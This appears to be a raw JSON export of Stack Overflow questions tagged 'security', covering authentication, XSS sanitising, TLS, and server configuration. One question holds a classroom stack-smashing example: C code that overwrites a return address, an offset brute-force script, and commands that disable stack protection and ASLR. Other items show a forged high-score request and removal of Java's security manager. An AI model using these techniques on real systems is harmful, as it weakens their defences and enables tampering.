+319\n   Microsoft.IdentityModel.Tokens.SessionSecurityTokenHandler.ApplyTransforms(Byte[] cookie, Boolean outbound) +217\n   Microsoft.IdentityModel.Tokens.SessionSecurityTokenHandler.ReadToken(XmlReader reader, SecurityTokenResolver tokenResolver) +1951\n   Microsoft.IdentityModel.Tokens.SessionSecurityTokenHandler.ReadToken(Byte[] token, SecurityTokenResolver tokenResolver) +149\n   Microsoft.IdentityModel.Web.SessionAuthenticationModule.ReadSessionTokenFromCookie(Byte[] sessionCookie) +598\n   Microsoft.IdentityModel.Web.SessionAuthenticationModule.TryReadSessionTokenFromCookie(SessionSecurityToken&amp; sessionToken) +120\n   Microsoft.IdentityModel.Web.SessionAuthenticationModule.OnAuthenticateRequest(Object sender, EventArgs eventArgs) +113\n   System.Web.SyncEventExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute() +136\n   System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean&amp; completedSynchronously) +69\n</code></pre>\n"},{"tags":["security","asp.net-mvc-4"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":90,"score":1,"question_id":12554796,"title":"MVC 4 Authentication Using Forms and Azure ACS","body":"<p>I have made a MVC 4 Project, set up to authenticate using STS (Azure ACS). Everyhing works. People can sign in using Google,Facebook or Live ID. </p>\n\n<p>My Question is now from a design point of view. Could i expect people to always have one of aboves to sign in with?  Can i add Twitter to Azure ACS also?</p>\n\n<p>Would it be a good idea to also add forms login and give people the option to register an user as in the old days and sign in?  How do i do this ? Is it just to enable forms authentication again in web.config.</p>\n\n<pre><code>&lt;!--Commented out by Identity and Access VS Package--&gt;\n&lt;!--&lt;authentication mode=\"Forms\"&gt;&lt;forms loginUrl=\"~/Account/Login\" timeout=\"2880\" /&gt;&lt;/authentication&gt;--&gt;\n</code></pre>\n\n<p>Right now when i put Aothorize on a controller, it redirect me to :</p>\n\n<pre><code>http://localhost:48451/login.aspx?ReturnUrl=%2fHome%2fAbout\n</code></pre>\n\n<p>How do i solve that? Im thinking that enabling the forms authentication again might solve it - but i would like some comments on the design first before just doing it.</p>\n"},{"tags":["asp.net",".net","security","xss","antixsslibrary"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":110,"score":2,"question_id":12554194,"title":"How to properly sanitize content with AntiXss Library?","body":"<p>I have a simple forums application, when someone posts any content, i do:</p>\n\n<pre><code>post.Content = Sanitizer.GetSafeHtml(post.Content);\n</code></pre>\n\n<p>Now, i am not sure if i am doing something wrong, or what is going on, but it does not allow almost no html. Even simple <code>&lt;b&gt;&lt;/b&gt;</code> is too much for it. So i guess that tool is totally useless.</p>\n\n<p>Now my question: Can anyone tell me how should i sanitize my users inputs so that they can post some images(<code>&lt;img&gt;</code> tags) and use bold emphasis etc?</p>\n"},{"tags":["django","forms","security","validation"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":93,"score":0,"question_id":5770323,"title":"Is there another way to create a more secure form in django","body":"<p>I have a paranoia about using hiddenfield in modelform for foreignkeys.\nI initialize the value before I send the form to user for foreignkeys and hide them\nand when a user sends back values by post, I just save the form with basic validation.\nCan anyone change data in hidden form fields for malicious reasons, or change data and change data in another one row?\nIs there another secure way?</p>\n\n<p>model:</p>\n\n<pre><code>class company(models.Model):\nuser=models.ForeignKey(User)\ncomname=models.CharField(max_length=255)\nregcode=models.CharField(max_length=128,blank=True,null=True)\n</code></pre>\n\n<p>froms:</p>\n\n<pre><code>class companyform(forms.ModelForm):\n\ncomname=forms.CharField(label=_(\"company name\"),help_text=_(\"This name appear on top of forms and printed content\"))\n\nregcode=forms.CharField(label=_(\"Register code \"),help_text=_(\"Registered code of organization in goverment\"))\n\nclass Meta: \n    model=careunitgeneralsetting\n    exclude = ('user',)\n</code></pre>\n\n<p>view:</p>\n\n<pre><code>return render_to_response(\"home_them.html\",{\"form\":unicode(companyform(initial=\"user\":request.user.id)},context_instance=RequestContext(request))\n</code></pre>\n"},{"tags":["php","security","phpass"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":24,"score":1,"question_id":12552700,"title":"PHPass Necessary Files","body":"<p>I was wondering if it's okay to delete the C folder that is included in phpass 0.3?</p>\n\n<p>Isn't PasswordHash.php the only file I need?</p>\n"},{"tags":["sql-server","security","iis7","integrated"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":189,"score":0,"question_id":11677529,"title":"Trying to setup IIS7 for remote sql server access using integrated security","body":"<p>I have an intranet site I'm trying to setup to use Windows authentication and impersonate the user through to a remote SQL server.  I've set these up in the past but the web server and SQL server have always been on the same box.  I've scoured Google trying different settings but I either get a password prompt or a Login failed for user 'NT AUTHORITY\\ANONYMOUS LOGON' (the identity of the user is correct on the website, but it's not authenticating through to SQL because it thinks it's anonymous).  Below is my setup so any insights are much appreciated.</p>\n\n<p>Web.Config</p>\n\n<pre><code>&lt;authentication mode=\"Windows\" /&gt;\n&lt;authorization&gt;\n    &lt;allow users=\"*\" /&gt;\n&lt;/authorization&gt;\n&lt;identity impersonate=\"true\" /&gt;\n</code></pre>\n\n<p>IIS7</p>\n\n<pre><code>Anonymouse Authentication - Disabled\nASP.NET Impersonation - Enabled\nBasic Authentication - Disabled\nForms Authentication - Disabled\nWindows Authentication - Enabled\n- Advanced Settings: Extended Protection=Off and Enable Kernal-mode authentication=Checked\n- Providers: Negotiate and NTLM (I came across a blog to use Negotiate:Kerberos but that didn't work)\n</code></pre>\n\n<p>Connection String</p>\n\n<pre><code>SqlConnection m_oConnection = new SqlConnection(\"Data Source=\" + ConfigurationServer + \";Failover Partner=\" + ConfigurationServerFailover + \";Initial Catalog=Master;Trusted_Connection=Yes;persist security info=False;\");\n</code></pre>\n\n<p>I came across another article and had the network administrator change the Active Directory record for the IIS server to say \"trust this computer for delegation\".  Still a no go.</p>\n\n<p>Is there a way for me to integrate security in an ASP.NET application using Windows authentication to a remote SQL server without a password prompt?</p>\n"},{"tags":["java","security","shell","tomcat","command"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":183,"score":0,"question_id":12533799,"title":"Execute shell command in Tomcat","body":"<p>So I have the following problem: I have a web service running inside a Tomcat7 server on Linux. The web service however has to execute some commands (mostly file operations such as copy and mount). Copy I've replaced with java.nio, but I don't think that there is a replacement for <code>mount</code>.</p>\n\n<p><em><strong>So I'm trying to execute shell commands out of my Tomcat Java process. Unfortunately it doesn't execute my commands</em></strong>. I've implemented the execution of shell commands in Java before. So my code should be correct:</p>\n\n<pre><code>Process pr = Runtime.getRuntime().exec(\"mount -o loop -t iso9660 &lt;myimage&gt; &lt;mymountpoint&gt;\");\npr.waitFor();\n</code></pre>\n\n<p><code>&lt;myimage&gt;</code> and <code>&lt;mymountpoint&gt;</code> are absolute paths, so no issues there either.</p>\n\n<ul>\n<li>I've debugged my commands and they are working when executed on the console.</li>\n<li>I've tried sending other commands. Simple commands such as <code>id</code> and <code>pwd</code> are working!</li>\n<li>I've tried using <code>/bin/bash -c \"&lt;command&gt;\"</code>, which didn't work.</li>\n<li>I've tried executing a shell script, which executes the command, which didn't work.</li>\n<li>I've tried escaping the spaces in my command, which didn't work.</li>\n</ul>\n\n<p>So I've digged even deeper and now I'm suspecting some Tomcat security policy (<strong>Sandbox</strong>?), which prevents me from executing the command. Since security is no issue for me (it's an internal system, completely isolated from the outside world), I've tried a hack, which became quite popular just recently:</p>\n\n<pre><code>System.setSecurityManager(null);\n</code></pre>\n\n<p>This didn't work either. I'm using Java7 and Tomcat7 on RHEL6. Tomcat7 is just extracted! I don't have any files in /etc/.. or any other folder than /opt/tomcat/, where I've extracted the zip from the Tomcat home page. I've searched the /opt/tomcat/conf folder for security settings, but all I could find was the file catalina.policy, where it didn't seem like I could set some security level for shell commands.</p>\n\n<p>Any ideas?</p>\n"},{"tags":["json","security","sockets","actionscript","ecma"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12551592,"title":"TCP Sockets, JSON and security","body":"<p>After searching profusely and vigorously, I have nothing on how to prevent security issues that arise when I use sockets for some multiplayer features in a Flash game. The amazing ECMAScript compliant/like languages have their source easily accessible which allows every passively aggresive nerd in his mom's basement to find crucial information to acquiring an attack vector. </p>\n\n<p>They find the IP of the server, the port which the server's listening on and in a few seconds - they're telneting and sending strings of data. And since JSON is so open and easily interpreted by humans, it is stringified on the client and parsed on the server-side, I have no idea how to prevent such a message from coming through (after they find the hitpoints the server is looking for, easily found in the swf):</p>\n\n<p>example:</p>\n\n<pre><code>{ \"request_type\" : \"WRITE_HS\", \"name\" : \"GloriousNerd\", \"highscore\" : 9999999 }\n</code></pre>\n\n<p>And their request is figured out as genuine, the score is written and the glorious nerd is victorious. The same can be done to create an endless stream of load highscore requests which return a number of items, clogging up bandwidth and the system for genuine requests.</p>\n\n<p>I keep a few standard approaches, scanning \"impossibru results\" and blacklisting IPs and the like, but nothing prevents it. It's a sufix operation, always. Everyone I've talked to says it is a losing battle. Kobayashi Maru? </p>\n\n<p>Is there a way to prevent access and encode some information the game and the server can uniquely share? Public keys, private keys, encryption of any sort is easily found and replicated. And JSON is just sitting there, naked. Some way to ensure it is coming through the SWF and the SWF only?</p>\n\n<p>Without resorting to authentification, I want people to play as soon as possible. It seems to me that the only way to prevent cheating is to generate an account and add value to it through achievements. But still, some men just want to watch the world burn.</p>\n\n<p>I turn to you, gentlemen of SO, for some wise input. Can you write some words of wisdom to my socket? I'm all port.</p>\n"},{"tags":["security","servlets"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12551147,"title":"Alternative to tomcat-users.xml for assigning roles","body":"<p>I am new to servlet security and have seen few examples/tutorials from various sites. \nIn those examples/sites they never mentioned how the ROLES are ASSIGNED to the users. </p>\n\n<p>In Head First Servlets and JSP book, i noticed that an xml file ( tomcat-users.xml ) can be used to define the roles for individual users. But that does not seem to be a good approach. Roles can either be read from LDAP or a database. Furthermore that xml file does not seem to be vendor neutral. So if one needs to switch to Jboss/Glashfish later, then it will be problematic. </p>\n\n<p>In Spring security the roles and other stuffs can be read from a database/LDAP-server.\nCan we achieve the same with PURE servlets? If yes how?</p>\n\n<p>In short: How can we assign different roles to a user through database?</p>\n\n<p>Thank you for your answers :)</p>\n"},{"tags":["security","url","hyperlink","wicket","wicket-1.5"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":67,"score":1,"question_id":12492446,"title":"Wicket 1.5 - How to configure link generated url?","body":"<p>I'm coding a wicket 1.5 application and I need to control the way url are rendered for security reason.</p>\n\n<pre><code>mountPage(\"xxx/yyy\", Zzzz.class)\n</code></pre>\n\n<p>is excellent for that but I have a problem with url generated for link listener. For exemple, if I add the following link to my page:</p>\n\n<pre><code>add(new Link&lt;Void&gt;(\"link-login\") {\n  @Override\n  public void onClick() {\n    setResponsePage(LoginPage.class);\n  }\n});\n</code></pre>\n\n<p>I obtain the following generated markup:</p>\n\n<pre><code>&lt;a wicket:id=\"link-login\" href=\"./home?0-1.ILinkListener-accessMenu-link~login\"&gt;Login&lt;/a&gt;\n</code></pre>\n\n<p>Is there a way to configure the generated url (<code>./home?0-1.ILinkListener-accessMenu-link~login</code>)? At least, I would like to remove the ~ character.</p>\n\n<p><strong>EDIT:</strong>\nSolved... According to wicket staff, generated href encode the wicket path using '-' as separator. If the wicket id contains a '-', it will be transform in '~' to avoid conflict. So in order to avoid it, just remove '-' from your wicket id.</p>\n"},{"tags":["c","security","buffer-overflow","stack-smash"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":80,"score":1,"question_id":12550123,"title":"Buffer overflow example not working on Debian 2.6","body":"<p>I am trying to make the buffer exploitation example (example3.c from <a href=\"http://insecure.org/stf/smashstack.html\" rel=\"nofollow\">http://insecure.org/stf/smashstack.html</a>) work on Debian Lenny 2.6 version. I know the gcc version and the OS version is different than the one used by Aleph One. I have disabled any stack protection mechanisms using -fno-stack-protector and sysctl -w kernel.randomize_va_space=0 arguments. To account for the differences in my setup and Aleph One's I introduced two parameters : offset1 -> Offset from buffer1 variable to the return address and offset2 -> how many bytes to jump to skip a statement. I tried to figure out these parameters by analyzing assembly code but was not successful. So, I wrote a shell script that basically runs the buffer overflow program with simultaneous values of offset1 and offset2 from (1-60). But much to my surprise I am still not able to break this program. It would be great if someone can guide me for the same. I have attached the code and assembly output for consideration. Sorry for the really long post :)</p>\n\n<p>Thanks.</p>\n\n<hr>\n\n<pre><code>// Modified example3.c from Aleph One paper - Smashing the stack\nvoid function(int a, int b, int c, int offset1, int offset2) {\n   char buffer1[5];\n   char buffer2[10];\n   int *ret;\n\n   ret = (int *)buffer1 + offset1;// how far is return address from buffer ?\n   (*ret) += offset2; // modify the value of return address\n}\n\nint main(int argc, char* argv[]) {\n  int x;\n  x = 0;\n  int offset1 = atoi(argv[1]);\n  int offset2 = atoi(argv[2]);\n  function(1,2,3, offset1, offset2);\n  x = 1; // Goal is to skip this statement using buffer overflow\n  printf(\"X : %d\\n\",x);\n  return 0;\n}\n\n-----------------\n// Execute the buffer overflow program with varying offsets\n#!/bin/bash\nfor ((i=1; i&lt;=60; i++))\ndo\n   for ((j=1; j&lt;=60; j++))\n   do\n    echo \"`./test $i $j`\"\n   done\ndone\n\n-- Assembler output\n(gdb) disassemble main\nDump of assembler code for function main:\n0x080483c2 &lt;main+0&gt;:    lea    0x4(%esp),%ecx\n0x080483c6 &lt;main+4&gt;:    and    $0xfffffff0,%esp\n0x080483c9 &lt;main+7&gt;:    pushl  -0x4(%ecx)\n0x080483cc &lt;main+10&gt;:   push   %ebp\n0x080483cd &lt;main+11&gt;:   mov    %esp,%ebp\n0x080483cf &lt;main+13&gt;:   push   %ecx\n0x080483d0 &lt;main+14&gt;:   sub    $0x24,%esp\n0x080483d3 &lt;main+17&gt;:   movl   $0x0,-0x8(%ebp)\n0x080483da &lt;main+24&gt;:   movl   $0x3,0x8(%esp)\n0x080483e2 &lt;main+32&gt;:   movl   $0x2,0x4(%esp)\n0x080483ea &lt;main+40&gt;:   movl   $0x1,(%esp)\n0x080483f1 &lt;main+47&gt;:   call   0x80483a4 &lt;function&gt;\n0x080483f6 &lt;main+52&gt;:   movl   $0x1,-0x8(%ebp)\n0x080483fd &lt;main+59&gt;:   mov    -0x8(%ebp),%eax\n0x08048400 &lt;main+62&gt;:   mov    %eax,0x4(%esp)\n0x08048404 &lt;main+66&gt;:   movl   $0x80484e0,(%esp)\n0x0804840b &lt;main+73&gt;:   call   0x80482d8 &lt;printf@plt&gt;\n0x08048410 &lt;main+78&gt;:   mov    $0x0,%eax\n0x08048415 &lt;main+83&gt;:   add    $0x24,%esp\n0x08048418 &lt;main+86&gt;:   pop    %ecx\n0x08048419 &lt;main+87&gt;:   pop    %ebp\n0x0804841a &lt;main+88&gt;:   lea    -0x4(%ecx),%esp\n0x0804841d &lt;main+91&gt;:   ret    \nEnd of assembler dump.\n\n(gdb) disassemble function\nDump of assembler code for function function:\n0x080483a4 &lt;function+0&gt;:    push   %ebp\n0x080483a5 &lt;function+1&gt;:    mov    %esp,%ebp\n0x080483a7 &lt;function+3&gt;:    sub    $0x20,%esp\n0x080483aa &lt;function+6&gt;:    lea    -0x9(%ebp),%eax\n0x080483ad &lt;function+9&gt;:    add    $0x30,%eax\n0x080483b0 &lt;function+12&gt;:   mov    %eax,-0x4(%ebp)\n0x080483b3 &lt;function+15&gt;:   mov    -0x4(%ebp),%eax\n0x080483b6 &lt;function+18&gt;:   mov    (%eax),%eax\n0x080483b8 &lt;function+20&gt;:   lea    0x7(%eax),%edx\n0x080483bb &lt;function+23&gt;:   mov    -0x4(%ebp),%eax\n0x080483be &lt;function+26&gt;:   mov    %edx,(%eax)\n0x080483c0 &lt;function+28&gt;:   leave  \n0x080483c1 &lt;function+29&gt;:   ret    \nEnd of assembler dump.\n</code></pre>\n"},{"tags":["windows","security","windows-firewall"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":289,"score":1,"question_id":11351651,"title":"How to check window's firewall is enabled or not using commands","body":"<p>I am adding a  windows firewall rule using <strong>netsh advfirewall firewall</strong> command in a setup program. My code is giving an error message if the system has windows firewall disabled.</p>\n\n<p>So I need to check the window's firewall status before executing the command <strong>netsh advfirewall firewall add</strong>. ie, if firewall is disabled, no need to add the  rule.</p>\n\n<p>I am checking if the firewall is enabled or not by using the window registry value \"<strong>EnableFirewall</strong>\".</p>\n\n<p><strong>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile</strong></p>\n\n<p>I am not sure this is the right way. There can be domain firewall profile(?) also.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["security","spring-mvc","xss","web-security","jackson"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":12538227,"title":"How to prevent XSS attacks with SpringMVC + Jackson Application?","body":"<p>The <a href=\"https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet\" rel=\"nofollow\">Cross Site Scripting Cheat Sheet</a> has many rules for securing against XSS attacks. I would like to implement those suggestions in my web app which is using Spring MVC + Jackson + JPA  + Hibernate Bean Validation. As an example consider the following code that is similar to what I have in my app. </p>\n\n<pre><code>public class MessageJson {\n    @NotEmpty // Bean Validation annotation  \n    private String title; \n\n    @NotEmpty\n    private String body; \n\n    // ... etc getters / setters\n}\n\npublic class BolgPostController \n{ \n\n     @RequestMapping(value=\"messages\",method=RequestMethod.POST) \n     public void createMessage(@Valid @RequestBody MessageJson message)\n     {\n           // **Question** How do I check that the message title and body don't contain \n           // nasty javascripts and other junk that should not be there? \n\n           // Call services to write data to the datababse\n     }\n\n     @RequestMapping(value=\"messages\",method=RequestMethod.get) \n     public @ResponseBody List&lt;MessageJson&gt; createMessage()\n     {\n           // get data from the database \n\n           // **Question** How do I escape all the data in the list of MessageJson before \n            I send it back to the data. \n     }\n}\n</code></pre>\n\n<p>I can see the following ways to implement the cheat sheet rules:</p>\n\n<ul>\n<li><strong>Option A</strong> Implement them manually in each controller method. </li>\n<li><strong>Option B</strong> Configure some extension to Spring MVC that can do it for me automatically </li>\n<li><strong>Option C</strong> Configure Jackson so that it can do it for me since most of my input/output goes through Jackson</li>\n</ul>\n\n<p>I am looking for some example configurations of SpringMVC in any of those three options, with a preference for option B and C. </p>\n"},{"tags":["security","authentication","encryption","network-programming","go"],"answer_count":3,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":119,"score":5,"question_id":12239555,"title":"Easy secure connection over unsafe network (both endpoints fully controlled)","body":"<p>I need to connect client &amp; server over untrusted network. I've considered using <a href=\"http://golang.org/pkg/crypto/tls/\" rel=\"nofollow\">TLS (crypto/tls)</a>, but from what I understand, I first need to create a create a <a href=\"http://golang.org/pkg/crypto/x509/#Certificate\" rel=\"nofollow\">crypto/x509.Certificate</a>. But I feel overwhelmed by all the parameters I need to pass to the <a href=\"http://golang.org/pkg/crypto/x509/#CreateCertificate\" rel=\"nofollow\">x509.CreateCertificate() function</a> - it says it needs all of the following fields: </p>\n\n<blockquote>\n  <p>SerialNumber, Subject, NotBefore, NotAfter, KeyUsage, BasicConstraintsValid, IsCA, MaxPathLen, SubjectKeyId, DNSNames, PermittedDNSDomainsCritical, PermittedDNSDomains. </p>\n</blockquote>\n\n<p>I have full control over both endpoints, so I believe I don't need any expiration or invalidation support/parameters (I can change keys both on client and server at any time I want) - so I can probably skip <em>NotBefore</em> and <em>NotAfter</em> (? or do I have to set them anyway?). What should I put in all the other fields, and why, to avoid any vulnerabilities? Also, can I use the same private/public key pair for both ways authentication (client to server, and server to client), or do I have to use 2 pairs?</p>\n\n<p>Or, is there something simpler than TLS that I could use? Note however, that I need to two way authentication.</p>\n\n<p><em><strong>EDIT:</em></strong></p>\n\n<p>I created a simple library based on suggestions from the accepted answer, plus key generation code from <a href=\"http://golang.org/src/pkg/crypto/tls/generate_cert.go\" rel=\"nofollow\">generate_cert.go</a> - see: </p>\n\n<blockquote>\n  <p><a href=\"https://github.com/akavel/tunnel/\" rel=\"nofollow\">github.com/akavel/tunnel</a></p>\n</blockquote>\n"},{"tags":["security","soap","encryption","ksoap2","android-ksoap2"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":53,"score":0,"question_id":12543457,"title":"ksoap2: how to ecrypt data or request","body":"<p>maybe question is stupid but.... i would like to know if exists a way to hide or encrypt data in a soap message. I want to prevent as much as possible classic problem about \"man in the middle\". So, i don't want \"middle man\" can understand my data. I thought about using an encryption function for merging all data of each element node with a symmetric key. And maybe it can be a solution, but my question is.... exists in ksoap a way to manage somekind of encryption/security ? If not, can you tell me a possible solution ?</p>\n\n<p>Thx for your time</p>\n"},{"tags":["php","security","session","authentication","download"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12548264,"title":"File Download Login Protection with Session","body":"<p>I'd like to protect some files with a session Authentication. Some files can be viewed by users, some not.</p>\n\n<p>I've impelemented a solution with mod_rewrite and readfile(). My problem is that this function will use a lot of ram and the server goes down when more users download files.</p>\n\n<p>I tried this:\n1) Pass a file trough the php handler and use the prepend function. It doesn't work because when the prepend php file finished the handler process the file, and in my case the handler was blocked because of invalid ASCII chars. I couldn't manage to stop the handler from processing but output the file.\n2) Put the session, ip and the folder name in a temporary file what I tried to check in my nginx.conf to exclude from rewriting. I failed because I was not able to extract only the folder name in nginx into a variable.</p>\n\n<p>How can I solve this problem? Has anyone a suggestion?</p>\n\n<p>Thanks</p>\n"},{"tags":["python","security","authentication","web-security","pyramid"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12547646,"title":"Pyramid.security: Is getting user info from a database with unauthenticated_userid(request) really secure?","body":"<p>I'm trying to make an accesible cache of user data using Pyramid doc's \"<a href=\"http://docs.pylonsproject.org/projects/pyramid_cookbook/en/latest/auth/user_object.html\" rel=\"nofollow\">Making A User Object Available as a Request Attribute</a>\" example. </p>\n\n<p>They're using this code to return a user object to set_request_property:</p>\n\n<pre><code>from pyramid.security import unauthenticated_userid\n\ndef get_user(request):\n    # the below line is just an example, use your own method of\n    # accessing a database connection here (this could even be another\n    # request property such as request.db, implemented using this same\n    # pattern).\n    dbconn = request.registry.settings['dbconn']\n    userid = unauthenticated_userid(request)\n    if userid is not None:\n        # this should return None if the user doesn't exist\n        # in the database\n        return dbconn['users'].query({'id':userid})\n</code></pre>\n\n<p>I don't understand why they're using unauthenticated_userid(request) to lookup user info from the database...isn't that insecure? That means that user might not be logged in, so why are you using that ID to get there private info from the database?</p>\n\n<p>Shouldn't</p>\n\n<pre><code>    userid = authenticated_userid(request)\n</code></pre>\n\n<p>be used instead to make sure the user is logged in? What's the advantage of using unauthenticated_userid(request)? Please help me understand what's going on here.</p>\n"},{"tags":["java","web-services","security","ejb"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":1,"view_count":153,"score":3,"question_id":12401329,"title":"@RunAs for @WebService EJB","body":"<p>I have an anonymous WebService EJB - webservice calls are working poperly.</p>\n\n<p>Now I want the WebService to RunAs as a specific SecurityRole.</p>\n\n<p>At the Webservice I have following Annotations:</p>\n\n<pre><code>@Stateless\n@WebService\n@DeclareRoles({ \"LoggedUser\" })\n@SecurityDomain(\"my-jboss-real\")\n@RunAs(\"LoggedUser\")\npublic class MyWebService { ...\n</code></pre>\n\n<p>Now I want to access a <code>@EJB</code> with <code>@RolesAllowed({\"LoggedUser\"})</code> from an Webservice Method there I get:</p>\n\n<pre><code>ERROR [org.jboss.aspects.tx.TxPolicy] javax.ejb.EJBTransactionRolledbackException: javax.ejb.EJBAccessException.message: 'Caller unauthorized'\nWARN  [org.jboss.ejb3.stateless.StatelessBeanContext] EJBTHREE-1337: do not get WebServiceContext property from stateless bean context, it should already have been injected\nERROR [org.jboss.ws.core.jaxws.SOAPFaultHelperJAXWS] SOAP request exception\njavax.ejb.EJBTransactionRolledbackException: javax.ejb.EJBAccessException.message: 'Caller unauthorized'\n        at org.jboss.ejb3.tx.Ejb3TxPolicy.handleInCallerTx(Ejb3TxPolicy.java:115)\n</code></pre>\n\n<p>I'm running on JBoss 5.1GA</p>\n\n<p>Is this the right use of <code>@RunAs</code> or is there another way to do this.</p>\n\n<p><strong>Edit</strong></p>\n\n<p>Added:</p>\n\n<pre><code>@Resource\nprivate WebServiceContext wsCtx;\n@Resource\nprivate EJBContext ejbCtx;\n\nmyWebServiceMethod(){\n     ...\n     System.out.println(\"EJBCtx: \" + ejbCtx.getCallerPrincipal());\n     System.out.println(\"EJBCtx: \" + ejbCtx.isCallerInRole(\"LoggedUser\"));\n     System.out.println(\"WebContext: \" + wsCtx.getUserPrincipal());\n     System.out.println(\"WebContext: \" + wsCtx.isUserInRole(\"LoggedUser\"));\n     ...\n</code></pre>\n\n<p>This Outputs:</p>\n\n<pre><code>EJBCtx: anonymous\nEJBCtx: false\nWebContext: anonymous\nWebContext: false\n</code></pre>\n"},{"tags":["python","security","markdown","injection","sanitization"],"answer_count":2,"favorite_count":5,"up_vote_count":5,"down_vote_count":0,"view_count":581,"score":5,"question_id":2358244,"title":"Secure Python Markdown Library","body":"<p>I'd like to enable users to leave rich text comments, possibly using markdown. I've installed the libraries used on Reddit, but am concerned about the javascript injection attack which occurred last year, especially since I'm still not clear on the details of how the attack was done. Should I still be concerned about comment security? Is there a test string I can put through my system to check for the same flaws that took down reddit?</p>\n"},{"tags":["security","encryption","base64"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12544731,"title":"Base64 Urls safer?","body":"<p>Are Base64 Urls safer than just regular urls. For example, a rest url like this:\n\"/user/12?status=true\" less safe than \"34kalist4u9mF0aWdhYmxlIGdlbmVyYXRpb24leGNlZWRzIHRo\"?</p>\n"},{"tags":["security","rest","backbone.js","client-side","restful-authentication"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":109,"score":2,"question_id":12542698,"title":"How do I securely connect a Backbone.js app to a database?","body":"<p>I am starting to plan a web-app and Backbone.js will be a perfect fit for the client side. I have been planning on using node for the backend but this is open for the time being.</p>\n\n<p>I need a way to secure the front-end app's connection to a database. I have had <a href=\"http://www.quora.com/Backbone-js-1/What-is-the-best-way-to-ensure-my-RESTful-server-only-talks-to-my-BackBone-js-application\" rel=\"nofollow\">discussions with others on Quora</a> but I think the thought process was too abstracted from the core problem. </p>\n\n<p>I would prefer to be accessing the data by RESTful end-points, but I need to ensure only my app can talk to the API. I will have full control over both the front-end and back-end of the application. There is a possibility of other apps being built around the database (in a year or two), however they will be developed by me (i.e. not a public API) and these will probably use separate OAuth end-points.</p>\n\n<p>Some notes on the app (may or may not be useful):</p>\n\n<ul>\n<li>The app is planned to be offered in a SaaS model where companies subscribe and are allowed multiple users.</li>\n<li>The data for each company needs to be secure and only accessible to members of that company.</li>\n<li>All traffic (front-end and app to API) will be sent through SSL.</li>\n</ul>\n\n<p>Any advice on the best way to do this will be greatly appreciated.</p>\n"},{"tags":["security","http","web-applications","https","web-security"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":12528917,"title":"Only uname/pwd verification over https - everything else in http","body":"<p>For username/pwd verification - the good websites use https - to avoid sending cleartext password over the wire. If I have a site where I want to do this - i.e. login over https. However - after logging in the rest of the stuff should be over http. Is this possible - if yes, why don't we see too many websites doing this. If not, why not?</p>\n"},{"tags":["java","security","redirect","java-web-start","webstart"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":89,"score":0,"question_id":12543233,"title":"Webstart security dialog is shown when fetching a HTTP URL that gets redirected","body":"<p>We have an application that is deployed with Java WebStart. There is a JEditorPane that shows some HTML content. This HTML also contains images. If the server returns a HTTP 3xx staus code because the actual resource was moved a WebStart security dialog is shown. This dialog asks the user for confirmation whether the application should be allowe to fetch data from a certain host.</p>\n\n<p>A very simple sample application:</p>\n\n<pre><code>package test;\n\nimport javax.swing.JEditorPane;\nimport javax.swing.JFrame;\nimport javax.swing.SwingUtilities;\n\npublic class Main extends JFrame {\n\npublic Main() {\n\n    JEditorPane p = new JEditorPane();\n    p.setContentType(\"text/html\");\n    p.setEditable(false);\n    p.setText(\"&lt;html&gt;&lt;img src=\\\"XXXX\\\" /&gt;&lt;/html&gt;\");\n\n    add(p);\n\n    setLocationRelativeTo(null);\n    setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n    setSize(500, 500);\n    setVisible(true);\n}\n\n\npublic static void main(String[] args) {\n    SwingUtilities.invokeLater(new Runnable() {\n\n        @Override\n        public void run() {\n            new Main();\n        }\n    });\n}\n\n}\n</code></pre>\n\n<p>XXXX -> <a href=\"http://www.hon.ch/HONcode/Seal/HONConduct432264.jpg\" rel=\"nofollow\">http://www.hon.ch/HONcode/Seal/HONConduct432264.jpg</a>\nSecurity dialog appears</p>\n\n<p>XXXX -> <a href=\"http://www.uni-due.de/imperia/md/images/cms/ude-logo.png\" rel=\"nofollow\">http://www.uni-due.de/imperia/md/images/cms/ude-logo.png</a>\n<strong>No</strong> security dialog appears</p>\n\n<p>The JNLP file:</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;jnlp spec=\"6.0+\" codebase=\".\" href=\"xxx.jnlp\"&gt;\n&lt;information&gt;\n    &lt;title&gt;xxx&lt;/title&gt;\n    